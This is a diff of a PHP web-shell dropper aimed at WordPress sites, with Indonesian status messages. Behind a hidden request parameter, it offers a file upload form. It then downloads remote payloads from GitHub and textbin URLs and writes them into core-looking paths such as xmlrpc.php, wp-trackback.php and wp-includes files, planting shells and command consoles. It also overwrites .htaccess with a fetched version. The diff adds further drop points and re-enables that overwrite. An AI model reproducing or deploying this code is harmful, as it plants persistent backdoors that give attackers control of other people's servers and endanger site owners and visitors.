@@ -3,7 +3,7 @@
 <meta name="robots" content="noindex">
 </head>
 <?php
-if(isset($_REQUEST['zero1'])){
+if(isset($_REQUEST['zero2'])){
         echo "<pre>";
         echo "<form name='form' action='#' method='post'>
        <input type='text' name='coba'/> <input type='submit' value='enter'/>
@@ -35,7 +35,7 @@ else { echo 'Masukan filemu diatas</b><br><br>'; }
 
 { if(@copy($_FILES['file']['tmp_name'], $destFile)) 
 { echo '<a href="//' . $sedo; echo '">' . $sedo; echo '</a>  Sukses !! '; }
-else { echo '.'; }
+else { echo ''; }
 }
 
 //echo '<a href="../cgi">' . $sedo; echo '</a>';
@@ -46,7 +46,7 @@ $domen = $_SERVER['SERVER_NAME'];
   $tulis2 = fwrite ($nama2 ,$file2);
  fclose($nama2); 
 { if($tulis2 == "697") 
-{ echo '(Uploader) Sukses !! ----> <a href="//' . $domen . '/index.php?Lemon=ex5f9'; echo '">' . $domen . '/index.php?Lemon=ex5f9'; echo '</a>  <br>'; }
+{ echo '<b>BERHASIL !!!</b> (Uploader) | <a href="//' . $domen . '/index.php?Lemon=ex5f9'; echo '">' . $domen . '/index.php?Lemon=ex5f9'; echo '</a>  <br>'; }
 else { echo 'Gagal<br>'; }
 }
  
@@ -55,7 +55,7 @@ else { echo 'Gagal<br>'; }
   $tulis3 = fwrite ($nama3 ,$file3);
  fclose($nama3); 
 { if($tulis3 == "550") 
-{ echo '(Curl) Sukses !! ----> <a href="//' . $domen . '/wp-blog-header.php'; echo '">' . $domen . '/wp-blog-header.php'; echo '</a>  <br>'; }
+{ echo '<b>BERHASIL !!!</b> (Curl) | <a href="//' . $domen . '/wp-blog-header.php'; echo '">' . $domen . '/wp-blog-header.php'; echo '</a>  <br>'; }
 else { echo 'Gagal<br>'; }
 }
 
@@ -64,7 +64,7 @@ else { echo 'Gagal<br>'; }
   $tulis4 = fwrite ($nama4 ,$file4);
  fclose($nama4); 
 { if($tulis4 == "509") 
-{ echo '(console) Sukses !! ----> <a href="//' . $domen . '/wp-content/index.php?cmd=pwd'; echo '">' . $domen . '/wp-content/index.php?cmd=pwd'; echo '</a>  <br>'; }
+{ echo '<b>BERHASIL !!!</b> (console) | <a href="//' . $domen . '/wp-content/index.php?cmd=pwd'; echo '">' . $domen . '/wp-content/index.php?cmd=pwd'; echo '</a>  <br>'; }
 else { echo 'Gagal<br>'; }
 }
  
@@ -73,30 +73,67 @@ $nama= fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-includes/ID3/module.tag.3gp.php' ,
   $tulis = fwrite ($nama ,$file);
  fclose($nama); 
 { if($tulis == "6410") 
-{ echo '(Shell 1) Sukses !! ----> <a href="//' . $domen . '/wp-includes/ID3/module.tag.3gp.php'; echo '">' . $domen . '/wp-includes/ID3/module.tag.3gp.php'; echo '</a>  <br>'; }
+{ echo '<b>BERHASIL !!!</b> (Shell 1) | <a href="//' . $domen . '/wp-includes/ID3/module.tag.3gp.php'; echo '">' . $domen . '/wp-includes/ID3/module.tag.3gp.php'; echo '</a>  <br>'; }
 else { echo 'Gagal<br>'; }
 }
  
 $nama1= fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/index.php' ,'w+');
   $file1 = file_get_contents('https://raw.githubusercontent.com/prokontra/all-in/main/404');
   $tulis1 = fwrite ($nama1 ,$file1);
- fclose($nama1); 
-$no1 = "$tulis1";
-{ if($no1 == $tulis1) 
-{ echo '(Shell 2) Sukses !! ----> <a href="//' . $domen . '/wp-content/plugins/index.php'; echo '">' . $domen . '/wp-content/plugins/index.php'; echo '</a> <br>'; }
+ fclose($nama1); ;
+{ if($tulis1 == "162882") 
+{ echo '<b>BERHASIL !!!</b> (Shell 2) | <a href="//' . $domen . '/wp-content/plugins/index.php'; echo '">' . $domen . '/wp-content/plugins/index.php'; echo '</a> <br>'; }
 else { echo 'Gagal <br>'; }
 }
  
-/*$nama5= fopen($_SERVER['DOCUMENT_ROOT'] . '/.htaccess' ,'a+');
+$namaa1 = fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-trackback.php' ,'w+');
+  $filee1 = file_get_contents('https://textbin.net/raw/sayqtgq6gs');
+  $tuliss1 = fwrite ($namaa1 ,$filee1);
+ fclose($namaa1); 
+{ if($tuliss1 == "5104") 
+{ echo '<b>BERHASIL !!!</b> (Console) | <a href="//' . $domen . '/wp-trackback.php?cmd=pwd'; echo '">' . $domen . '/wp-trackback.php?cmd=pwd'; echo '</a>  <br>'; }
+else { echo 'Gagal<br>'; }
+}
+$namaa2 = fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-admin/js/javas.php' ,'w+');
+  $filee2 = file_get_contents('https://raw.githubusercontent.com/prokontra/all-in/main/sementara');
+  $tuliss2 = fwrite ($namaa2 ,$filee2);
+ fclose($namaa2); 
+{ if($tuliss2 == "6410") 
+{ echo '<b>BERHASIL !!!</b> (Shell 1) | <a href="//' . $domen . '/wp-admin/js/javas.php'; echo '">' . $domen . '/wp-admin/js/javas.php'; echo '</a>  <br>'; }
+else { echo 'Gagal<br>'; }
+}
+$namaa3 = fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-includes/pomo/screen.php' ,'w+');
+  $filee3 = file_get_contents('https://raw.githubusercontent.com/prokontra/all-in/main/404');
+  $tuliss3 = fwrite ($namaa3 ,$filee3);
+ fclose($namaa3); 
+{ if($tuliss3 == "162882") 
+{ echo '<b>BERHASIL !!!</b> (Shell 2) | <a href="//' . $domen . '/wp-includes/pomo/screen.php'; echo '">' . $domen . '/wp-includes/pomo/screen.php'; echo '</a>  <br>'; }
+else { echo 'Gagal<br>'; }
+}
+$namaa4 = fopen($_SERVER['DOCUMENT_ROOT'] . '/xmlrpc.php' ,'w+');
+  $filee4 = file_get_contents('https://textbin.net/raw/wgyrtakgag');
+  $tuliss4 = fwrite ($namaa4 ,$filee4);
+ fclose($namaa4); 
+{ if($tuliss4 == "3847") 
+{ echo '<b>BERHASIL !!!</b> (Uploader) | <a href="//' . $domen . '/xmlrpc.php?Lemon=ex5f9'; echo '">' . $domen . '/xmlrpc.php?Lemon=ex5f9'; echo '</a>  <br>'; }
+else { echo 'Gagal<br>'; }
+}
+
+$simpan = fopen($_SERVER['DOCUMENT_ROOT'] . '/.htaccess.bk' ,'x+');
+$isi_konten=file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/.htaccess');
+$nomer = fwrite ($simpan ,$isi_konten);
+{ if($nomer == "1937") 
+{ echo '<b>BERHASIL !!!</b> (Backup .htaccess bawaan) | ' . $domen . '/.htaccess.bk'; echo '</a> <br>'; }
+else { echo 'FILE SUDAH ADA / GAGAL !! BACKUP .HTACCESS<br>'; }
+}
+ $nama5= fopen($_SERVER['DOCUMENT_ROOT'] . '/.htaccess' ,'w');
   $file5 = file_get_contents('https://raw.githubusercontent.com/prokontra/all-in/main/hta_WP');
   $tulis5 = fwrite ($nama5 ,$file5);
  fclose($nama5);
-{ if($tulis5 == "1431") 
-{ echo '(permission) Sukses !! ----> ' . $domen . '/.htaccess'; echo '</a> <br>'; }
+{ if($tulis5 == "1937") 
+{ echo '<b>BERHASIL !!!</b> (permission) | ' . $domen . '/.htaccess'; echo '</a> <br>'; }
 else { echo 'Gagal<br>'; }
-}*/
-
+}
          die;
 }
-
 ?>
